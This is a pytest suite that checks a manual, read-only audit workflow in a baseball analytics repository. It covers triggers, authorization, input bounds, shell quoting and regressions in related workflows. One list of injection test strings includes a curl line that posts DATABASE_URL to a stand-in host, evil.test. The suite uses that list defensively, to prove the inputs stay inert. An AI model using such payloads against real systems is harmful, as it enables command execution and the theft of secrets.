"""Structure of the manual no-op qualification candidate audit workflow.

The reviewed workflow source is the authority for how this audit can be
invoked. These tests own the properties that make it manual-only, read-only,
bounded, and incapable of dispatching anything.

They also own the property that adding it disturbed nothing: the no-op write
qualification keeps its exact work-item contract, and the scheduled sync keeps
its lanes and modes.
"""

import ast
import os
import re
import subprocess
import tempfile
from pathlib import Path

import pytest
import yaml


REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOW_PATH = (
    REPO_ROOT / '.github/workflows/manual-noop-qualification-candidate-audit.yml'
)
NOOP_WORKFLOW_PATH = (
    REPO_ROOT / '.github/workflows/manual-game-driven-noop-qualification.yml'
)
SYNC_WORKFLOW_PATH = REPO_ROOT / '.github/workflows/baseballos-sync.yml'
SERVICE_PATH = (
    REPO_ROOT / 'backend/services/noop_qualification_candidate_audit.py'
)

JOB = 'candidate-audit'
REPOSITORY = 'NickolisK24/bullpen-intel-engine'
MODE_ENV = 'GAME_DRIVEN_INGESTION_MODE'
CONFIRMATION = 'AUDIT_NOOP_QUALIFICATION_CANDIDATES'

FORBIDDEN_TRIGGERS = (
    'schedule', 'push', 'pull_request', 'pull_request_target',
    'workflow_run', 'repository_dispatch', 'issue_comment', 'release',
)

EXPECTED_INPUT_ENV = {
    'INPUT_EXPECTED_HEAD_SHA': '${{ inputs.expected_head_sha }}',
    'INPUT_CONFIRMATION': '${{ inputs.confirmation }}',
    'INPUT_LOOKBACK_DAYS': '${{ inputs.lookback_days }}',
    'INPUT_CANDIDATE_LIMIT': '${{ inputs.candidate_limit }}',
    'INPUT_ELIGIBLE_TARGET_COUNT': '${{ inputs.eligible_target_count }}',
    'INPUT_OPERATOR_NOTE': '${{ inputs.operator_note }}',
}


@pytest.fixture(scope='module')
def workflow_text():
    return WORKFLOW_PATH.read_text(encoding='utf-8')


@pytest.fixture(scope='module')
def workflow(workflow_text):
    return yaml.safe_load(workflow_text)


@pytest.fixture(scope='module')
def triggers(workflow):
    return workflow[True]


@pytest.fixture(scope='module')
def job(workflow):
    return workflow['jobs'][JOB]


@pytest.fixture(scope='module')
def inputs(triggers):
    return triggers['workflow_dispatch']['inputs']


def _steps(job):
    return list(job.get('steps') or ())


def _run_steps(job):
    return [step for step in _steps(job) if step.get('run')]


def _step(job, fragment):
    for step in _steps(job):
        if fragment.lower() in str(step.get('name', '')).lower():
            return step
    raise AssertionError(f'no step matching {fragment!r}')


# ── Trigger contract ────────────────────────────────────────────────────────


def test_the_workflow_exists_and_is_named_correctly(workflow):
    assert WORKFLOW_PATH.is_file()
    assert workflow['name'] == 'Manual No-Op Qualification Candidate Audit'


def test_workflow_dispatch_is_the_only_trigger(triggers):
    assert list(triggers) == ['workflow_dispatch']


@pytest.mark.parametrize('trigger', FORBIDDEN_TRIGGERS)
def test_no_automatic_trigger_exists(triggers, trigger):
    assert trigger not in triggers


def test_no_cron_expression_appears(workflow_text):
    assert 'cron' not in workflow_text.lower()


def test_only_one_job_exists(workflow):
    assert list(workflow['jobs']) == [JOB]


def test_the_audit_cannot_dispatch_another_workflow(workflow_text):
    lowered = workflow_text.lower()
    for forbidden in (
        'workflow_dispatch:\n        inputs:\n          game_pk',
        'gh workflow run', 'actions/github-script', 'workflow_call',
        'run_game_driven_noop_qualification',
    ):
        assert forbidden not in lowered


def test_the_audit_never_invokes_a_production_writer(workflow_text):
    for forbidden in (
        'run_daily_sync.py', 'run_postgame_refresh.py',
        'run_tonight_refresh.py', 'refresh_slate_schedule.py',
        'game_driven_ingestion.py',
    ):
        assert forbidden not in workflow_text


# ── Input contract ──────────────────────────────────────────────────────────


def test_exactly_the_six_declared_inputs_exist(inputs):
    assert sorted(inputs) == [
        'candidate_limit', 'confirmation', 'eligible_target_count',
        'expected_head_sha', 'lookback_days', 'operator_note',
    ]


@pytest.mark.parametrize('name', ['expected_head_sha', 'confirmation'])
def test_authorization_inputs_are_required(inputs, name):
    assert inputs[name]['required'] is True


def test_the_confirmation_names_its_exact_form(inputs):
    assert CONFIRMATION in inputs['confirmation']['description']


def test_the_operator_note_is_informational_only(inputs):
    assert inputs['operator_note']['required'] is False
    assert inputs['operator_note'].get('default') == ''
    described = inputs['operator_note']['description'].lower()
    assert 'never affect authorization' in described


@pytest.mark.parametrize('name,default', [
    ('lookback_days', '30'),
    ('candidate_limit', '20'),
    ('eligible_target_count', '5'),
])
def test_bounded_inputs_carry_their_defaults(inputs, name, default):
    assert inputs[name]['default'] == default


# ── Authorization and bounds ────────────────────────────────────────────────


def test_the_job_is_gated_on_every_authorization_condition(job):
    condition = ' '.join(str(job['if']).split())
    assert "github.event_name == 'workflow_dispatch'" in condition
    assert f"github.repository == '{REPOSITORY}'" in condition
    assert "github.ref == 'refs/heads/main'" in condition
    assert 'github.actor == github.repository_owner' in condition


def test_the_preflight_requires_a_lowercase_forty_character_sha(job):
    guard = _step(job, 'Refuse an unauthorized invocation')['run']
    assert "grep -Eq '^[0-9a-f]{40}$'" in guard


def test_the_preflight_compares_sha_to_the_resolved_commit(job):
    guard = _step(job, 'Refuse an unauthorized invocation')['run']
    assert '"$INPUT_EXPECTED_HEAD_SHA" != "$RESOLVED_SHA"' in guard


def test_the_preflight_requires_the_exact_confirmation(job):
    guard = _step(job, 'Refuse an unauthorized invocation')['run']
    assert f'"$INPUT_CONFIRMATION" != "{CONFIRMATION}"' in guard


@pytest.mark.parametrize('variable,low,high', [
    ('INPUT_LOOKBACK_DAYS', 1, 120),
    ('INPUT_CANDIDATE_LIMIT', 1, 50),
    ('INPUT_ELIGIBLE_TARGET_COUNT', 1, 10),
])
def test_numeric_bounds_are_enforced_in_the_preflight(job, variable, low, high):
    guard = _step(job, 'Refuse an unauthorized invocation')['run']
    assert f'bounded "${variable}" {low} {high}' in guard


def test_eligible_target_cannot_exceed_candidate_limit(job):
    guard = _step(job, 'Refuse an unauthorized invocation')['run']
    assert (
        '"$INPUT_ELIGIBLE_TARGET_COUNT" -gt "$INPUT_CANDIDATE_LIMIT"' in guard
    )


# ── Serialization and safety ────────────────────────────────────────────────


def test_it_shares_the_production_sync_concurrency_lane(workflow):
    assert workflow['concurrency']['group'] == 'baseballos-sync'


def test_cancel_in_progress_is_false(workflow):
    assert workflow['concurrency']['cancel-in-progress'] is False


def test_permissions_are_read_only(workflow):
    assert workflow['permissions'] == {'contents': 'read'}


def test_the_job_is_bounded_to_twenty_minutes(job):
    assert job['timeout-minutes'] <= 20


def test_auto_sync_is_disabled(job):
    env = _step(job, 'Run the read-only candidate audit').get('env') or {}
    assert env['AUTO_SYNC'] == 'false'


def test_no_game_driven_write_mode_variable_is_set(workflow_text):
    for line in workflow_text.splitlines():
        if line.strip().startswith('#'):
            continue
        assert f'{MODE_ENV}:' not in line


def test_no_publication_or_sync_url_secret_is_exposed(job):
    """Checked against resolved env values, not comment prose."""
    for step in _steps(job):
        env = step.get('env') or {}
        for value in env.values():
            assert 'BASEBALLOS_SYNC_URL' not in str(value)
            assert 'PUBLICATION' not in str(value).upper()


def test_the_admin_token_is_present_only_with_its_startup_justification(
    workflow_text, job,
):
    """config.py makes booting against production impossible without it.

    APP_ENV != production refuses a non-local DATABASE_URL; APP_ENV=production
    refuses to boot without ADMIN_API_TOKEN. The token is therefore a startup
    requirement, not an audit capability — and the workflow must say so rather
    than carrying it silently.
    """
    env = _step(job, 'Run the read-only candidate audit').get('env') or {}
    assert env.get('ADMIN_API_TOKEN') == (
        '${{ secrets.BASEBALLOS_ADMIN_API_TOKEN }}'
    )
    assert 'APPLICATION STARTUP ONLY' in workflow_text
    assert 'config.py:231' in workflow_text


# ── Shell boundary ──────────────────────────────────────────────────────────


def test_no_github_expression_appears_inside_any_run_script(job):
    for step in _run_steps(job):
        assert '${{' not in step['run'], step.get('name')


@pytest.mark.parametrize('name', sorted(EXPECTED_INPUT_ENV))
def test_every_input_crosses_the_boundary_through_env(job, name):
    consumers = [
        step for step in _run_steps(job) if f'${name}' in step['run']
    ]
    assert consumers, name
    for step in consumers:
        env = step.get('env') or {}
        assert env.get(name) == EXPECTED_INPUT_ENV[name], step.get('name')


def test_every_input_is_referenced_only_as_a_quoted_shell_variable(job):
    for step in _run_steps(job):
        script = step['run']
        for variable in EXPECTED_INPUT_ENV:
            name = re.escape(variable)
            total = len(re.findall(r'\$\{?' + name, script))
            if not total:
                continue
            quoted = len(re.findall(r'"\$' + name + r'"', script))
            braced = len(re.findall(
                r'"[^"\n]*\$\{' + name + r'\}[^"\n]*"', script,
            ))
            assert quoted + braced == total, (step.get('name'), variable)


HOSTILE = (
    '$(touch CANARY)', '`touch CANARY`', '; touch CANARY',
    '&& touch CANARY', '| touch CANARY', '" ; touch CANARY ; echo "',
    'a\ntouch CANARY', '$SECRET_KEY', '${DATABASE_URL}',
    '"; curl http://evil.test -d "$DATABASE_URL',
)


def _run_preflight(job, tmp_path, **overrides):
    script = _step(job, 'Refuse an unauthorized invocation')['run']
    canary = tmp_path / 'pwned'
    sha = 'a' * 40
    env = {
        'PATH': os.environ.get('PATH', ''),
        'INPUT_EXPECTED_HEAD_SHA': sha,
        'INPUT_CONFIRMATION': CONFIRMATION,
        'INPUT_LOOKBACK_DAYS': '30',
        'INPUT_CANDIDATE_LIMIT': '20',
        'INPUT_ELIGIBLE_TARGET_COUNT': '5',
        'INPUT_OPERATOR_NOTE': '',
        'RESOLVED_SHA': sha,
    }
    env.update({
        key: str(value).replace('CANARY', str(canary))
        for key, value in overrides.items()
    })
    path = tmp_path / 'preflight.sh'
    path.write_text(script)
    result = subprocess.run(
        ['bash', str(path)], capture_output=True, text=True, env=env,
    )
    return result, canary


@pytest.mark.parametrize('hostile', HOSTILE)
def test_a_hostile_operator_note_stays_inert(job, hostile, tmp_path):
    result, canary = _run_preflight(
        job, tmp_path, INPUT_OPERATOR_NOTE=hostile,
    )
    assert result.returncode == 0, result.stderr
    assert not canary.exists(), 'the operator note executed a command'


@pytest.mark.parametrize('field', [
    'INPUT_CONFIRMATION', 'INPUT_LOOKBACK_DAYS', 'INPUT_CANDIDATE_LIMIT',
    'INPUT_ELIGIBLE_TARGET_COUNT', 'INPUT_EXPECTED_HEAD_SHA',
])
def test_a_hostile_bounded_input_cannot_execute_and_is_refused(
    job, field, tmp_path,
):
    result, canary = _run_preflight(
        job, tmp_path, **{field: '$(touch CANARY)'},
    )
    assert result.returncode == 1
    assert not canary.exists(), f'{field} executed a command'


@pytest.mark.parametrize('value', ['0', '121', '-1', 'abc', '1.5', ''])
def test_an_out_of_bounds_lookback_is_refused(job, value, tmp_path):
    result, _ = _run_preflight(job, tmp_path, INPUT_LOOKBACK_DAYS=value)
    assert result.returncode == 1


def test_a_target_above_the_candidate_limit_is_refused(job, tmp_path):
    result, _ = _run_preflight(
        job, tmp_path, INPUT_CANDIDATE_LIMIT='2',
        INPUT_ELIGIBLE_TARGET_COUNT='5',
    )
    assert result.returncode == 1


def test_the_happy_path_preflight_passes(job, tmp_path):
    result, _ = _run_preflight(job, tmp_path)
    assert result.returncode == 0
    assert 'Authorization preconditions satisfied.' in result.stdout


# ── Evidence ordering ───────────────────────────────────────────────────────


def test_the_artifact_is_scanned_before_upload_and_upload_before_the_gate(job):
    order = {step.get('id'): index for index, step in enumerate(_steps(job))}
    gate = next(
        index for index, step in enumerate(_steps(job))
        if 'final audit gate' in str(step.get('name', '')).lower()
    )
    assert order['audit'] < order['scan'] < order['upload'] < gate


def test_an_unsafe_artifact_is_never_uploaded(job):
    upload = next(step for step in _steps(job) if step.get('id') == 'upload')
    assert "steps.scan.outcome == 'success'" in str(upload['if'])


def test_the_shared_scanner_is_reused(job):
    assert 'scan_forbidden_artifact_content.py' in _step(
        job, 'Scan the evidence artifact'
    )['run']


def test_the_artifact_is_run_scoped_with_thirty_day_retention(job):
    upload = next(step for step in _steps(job) if step.get('id') == 'upload')
    assert upload['with']['name'] == (
        'noop-qualification-candidate-audit-${{ github.run_id }}'
    )
    assert upload['with']['retention-days'] == 30
    assert upload['with']['if-no-files-found'] == 'error'


def test_the_final_gate_is_not_continue_on_error(job):
    assert _step(job, 'Final audit gate').get('continue-on-error') is not True


def test_scan_upload_and_audit_failures_all_fail_the_gate(job):
    gate = _step(job, 'Final audit gate')
    env = gate.get('env') or {}
    assert env['SCAN_OUTCOME'] == '${{ steps.scan.outcome }}'
    assert env['UPLOAD_OUTCOME'] == '${{ steps.upload.outcome }}'
    assert env['AUDIT_OUTCOME'] == '${{ steps.audit.outcome }}'
    assert gate['run'].count('exit 1') >= 3


def test_each_continue_on_error_step_exits_with_its_own_result(job):
    for name in ('Run the read-only candidate audit', 'Scan the evidence'):
        assert 'exit "$exit_code"' in _step(job, name)['run']


def test_the_gate_states_it_authorizes_nothing(job):
    gate = _step(job, 'Final audit gate')['run'].lower()
    assert 'does not authorize' in gate


def test_every_shell_block_parses(job):
    for step in _run_steps(job):
        with tempfile.NamedTemporaryFile(
            'w', suffix='.sh', delete=False,
        ) as handle:
            handle.write(step['run'])
            path = handle.name
        try:
            result = subprocess.run(
                ['bash', '-n', path], capture_output=True, text=True,
            )
        finally:
            Path(path).unlink(missing_ok=True)
        assert result.returncode == 0, step.get('name')


# ── Structural read-only proof of the service ───────────────────────────────


@pytest.fixture(scope='module')
def service_tree():
    return ast.parse(SERVICE_PATH.read_text(encoding='utf-8'))


FORBIDDEN_SESSION_CALLS = (
    'add', 'add_all', 'delete', 'commit', 'flush', 'merge',
    'bulk_save_objects', 'bulk_insert_mappings', 'bulk_update_mappings',
)


def _receiver_name(node):
    """Best-effort dotted name of the object a method is called on."""
    parts = []
    current = node.func.value
    while isinstance(current, ast.Attribute):
        parts.append(current.attr)
        current = current.value
    if isinstance(current, ast.Name):
        parts.append(current.id)
    return '.'.join(reversed(parts))


@pytest.mark.parametrize('name', FORBIDDEN_SESSION_CALLS)
def test_the_audit_service_contains_no_write_api_call(service_tree, name):
    """Scoped to session-like receivers.

    A Python ``set.add`` is not a database write; asserting on the bare method
    name would confuse the two and make the guard meaningless.
    """
    for node in ast.walk(service_tree):
        if not (isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)):
            continue
        if node.func.attr != name:
            continue
        receiver = _receiver_name(node)
        assert 'session' not in receiver.lower(), ast.dump(node.func)
        assert not receiver.endswith('db'), ast.dump(node.func)


def test_the_audit_service_declares_no_session_write_receiver():
    """Belt and braces: no `session.<write>` text form anywhere."""
    source = SERVICE_PATH.read_text(encoding='utf-8')
    for name in FORBIDDEN_SESSION_CALLS:
        assert f'session.{name}(' not in source
        assert f'db.session.{name}(' not in source


def test_the_audit_service_never_commits(service_tree):
    source = SERVICE_PATH.read_text(encoding='utf-8')
    assert '.commit(' not in source


def test_the_only_sql_mutation_verb_is_the_refused_probe(service_tree):
    """One UPDATE exists: the canonical write probe, bounded WHERE 1 = 0."""
    docstrings = set()
    for node in ast.walk(service_tree):
        if isinstance(node, (ast.Module, ast.FunctionDef, ast.AsyncFunctionDef,
                             ast.ClassDef)):
            doc = ast.get_docstring(node, clean=False)
            if doc:
                docstrings.add(doc)
    literals = [
        node.value for node in ast.walk(service_tree)
        if isinstance(node, ast.Constant)
        and isinstance(node.value, str)
        and node.value not in docstrings
    ]
    verb = re.compile(r'\b(INSERT|UPDATE|DELETE|TRUNCATE|DROP|ALTER)\b')
    # A bare verb is the reported statement CLASS label, not a statement.
    # Only strings that actually look like SQL count.
    statements = [
        text for text in literals
        if verb.search(text) and len(text.split()) > 1
    ]
    class_labels = [
        text for text in literals
        if verb.fullmatch(text.strip())
    ]
    assert len(statements) == 1, statements
    probe = statements[0]
    assert probe.startswith('UPDATE game_logs SET')
    assert 'WHERE 1 = 0' in probe
    # The class label is reported so the artifact can name the probe without
    # reproducing its SQL.
    assert class_labels == ['UPDATE'], class_labels


def test_the_audit_service_reaches_the_lane_in_shadow_only(service_tree):
    source = SERVICE_PATH.read_text(encoding='utf-8')
    assert 'MODE_WRITE' not in source
    assert 'MODE_AUTHORITATIVE' not in source
    assert 'include_backfill' not in source
    assert 'PERMITTED_INGESTION_MODE = lane.MODE_SHADOW' in source


def test_the_audit_service_declares_every_reachable_table(service_tree):
    from services import noop_qualification_candidate_audit as service

    assert set(service.FINGERPRINT_TABLES) == {
        'game_logs', 'pitchers', 'game_ingestion_work_items',
        'postgame_processed_games', 'scheduled_games', 'sync_failures',
    }


# ── Regression: nothing else moved ──────────────────────────────────────────


@pytest.fixture(scope='module')
def noop_workflow():
    return yaml.safe_load(NOOP_WORKFLOW_PATH.read_text(encoding='utf-8'))


def test_the_noop_write_qualification_remains_manual_only(noop_workflow):
    assert list(noop_workflow[True]) == ['workflow_dispatch']


def test_the_noop_write_qualification_keeps_its_work_item_contract():
    from services import noop_write_qualification as qualification

    assert qualification.EXPECTED_LANE_BOOKKEEPING_DELTA == {
        'work_items_created': 0,
        'work_items_updated': 1,
        'work_items_completed': 1,
        'checkpoints_advanced': 1,
        'commits_performed': 1,
    }
    assert qualification.REQUIRED_WORK_ITEM_STATUS_BEFORE == 'completed'


def test_the_audit_workflow_does_not_reference_the_write_qualification(
    workflow_text,
):
    assert 'manual-game-driven-noop-qualification' not in workflow_text


@pytest.fixture(scope='module')
def sync_workflow():
    return yaml.safe_load(SYNC_WORKFLOW_PATH.read_text(encoding='utf-8'))


def test_daily_and_postgame_remain_shadow(sync_workflow):
    modes = []
    for job_definition in sync_workflow['jobs'].values():
        for step in job_definition.get('steps') or ():
            env = step.get('env') or {}
            if MODE_ENV in env:
                modes.append(env[MODE_ENV])
    assert sorted(modes) == ['off', 'shadow', 'shadow']


def test_the_scheduled_sync_keeps_its_three_schedules(sync_workflow):
    crons = [entry['cron'] for entry in sync_workflow[True]['schedule']]
    assert crons == ['0 10 * * *', '0 14 * * *', '0 2,4,6 * * *']


def test_the_shadow_observer_remains_credential_free(sync_workflow):
    observer = str(sync_workflow['jobs']['shadow-activation-health'])
    assert 'secrets.' not in observer


def test_the_scheduled_sync_never_invokes_the_audit(sync_workflow):
    assert 'candidate_audit' not in str(sync_workflow)
    assert 'candidate-audit' not in str(sync_workflow)
